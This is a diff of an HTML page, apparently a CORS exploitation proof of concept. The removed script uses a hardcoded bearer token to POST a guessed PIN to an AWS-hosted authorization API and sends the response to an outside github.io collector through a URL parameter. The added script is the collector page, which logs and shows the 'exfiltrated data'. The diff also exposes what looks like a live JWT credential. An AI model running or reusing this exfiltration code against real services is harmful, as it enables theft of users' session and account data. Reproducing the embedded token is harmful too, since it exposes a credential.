@@ -8,27 +8,19 @@
 <body>
     <h1>Data Received</h1>
     <div id="log"></div>
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://sifd9a73ca.execute-api.ap-south-1.amazonaws.com/staging/api/v2/auth/pin/authorize", true);
-xhr.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiYmNkMjk4OWFkMDBkOTU0ZGY3MGI1MTVkOTdhODc1MDY5OThhMTBjOGViODMyZWIyNDE5OTIwYTAzMjU5NWJjNjZmZTk4NGU5ZjY4ZThkY2UiLCJpYXQiOjE3Mjc5MzQyMjcuMTAxMjExLCJuYmYiOjE3Mjc5MzQyMjcuMTAxMjE3LCJleHAiOjE3MzE4MjIyMjcuMDY4NjY2LCJzdWIiOiIxNTYxMzYiLCJzY29wZXMiOltdfQ.US9HExB8q77yPM4HKgOJbiR2cKtJFm35IWd4-SB5THMV383WiMPebjIr-UoBFXudzacu5LvtbXM5k02VvIIPdfcOXLss-WzVWyZoukT9zdwcJ7X877NQjH6nPNij8awDHKDG_pLlh_Li1LUUeA8jCslV0Vvi0-7y6s8x5RarAeYV6WRAqTHBPK1ckNDFVoOFPMUUmkP7iBXoc_re_s2nZJd5YLmgeXOdyyqAelPy71eFVamCWohxBpfS4CGqI19KpVuXNN-AlrsMVRJXHS5DhKLfSHMx3_AlDXkPMKy2muBv2YRhq5eyJNytBwNS2b9uQxqyUlyZM_XxYTWObbawF7QvuI7GnF5EKEOAqZmZ19Cgro6Uwl72NvUkblCyM-tr0XW_BGJjC9Gm9swbXjI8wRKQ98lGPY-dBzg6fYam6-3WCah1hGrhgUrZs_kg13QM0q7tA3c6nu8yxLzGDIRCIKBcbI74DmHUP-wtPswjEjyilCeyUjfkr7UcWEg2TXA_f28hjaikNJNcvPtJXRBcKif9fAtpwIMK9kKb5zVhLaohO5oLwg9pSemwqfAaoFAYrWaYNBLunbRg5kVTHejXP2NJw7BCRsV1yXdgQCkEqm12WQFRrWbXO_C_KCQb4QMONYNHN9ocdGE2pkZhC0ML9sG-Afsvy_EXLsXhRa_8XaU");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.onreadystatechange = function () {
-    if (xhr.readyState == 4 && xhr.status == 200) {
-        // Send the response to your GitHub page
-        var exfil = new XMLHttpRequest();
-        var exfilUrl = "https://redeye1003.github.io/cors?data=" + encodeURIComponent(xhr.responseText);
-        exfil.open("GET", exfilUrl, true);
-        exfil.send();
-    }
-};
-xhr.send(JSON.stringify({
-    "auth_pin": "1234",
-    "app_identifier": "android",
-    "client_identifier": "MOBILE_APP",
-    "deviceId": "fake-device-id"
-}));
-</script>
+ <script>
+        // Parse URL parameters for exfiltrated data
+        const urlParams = new URLSearchParams(window.location.search);
+        const exfiltratedData = urlParams.get('data');
+
+        // Log exfiltrated data
+        if (exfiltratedData) {
+            console.log("Exfiltrated Data: ", exfiltratedData);
+            document.getElementById('log').innerText = "Exfiltrated Data: " + exfiltratedData;
+        } else {
+            document.getElementById('log').innerText = "No data received.";
+        }
+    </script>
 
 </body>
 </html>
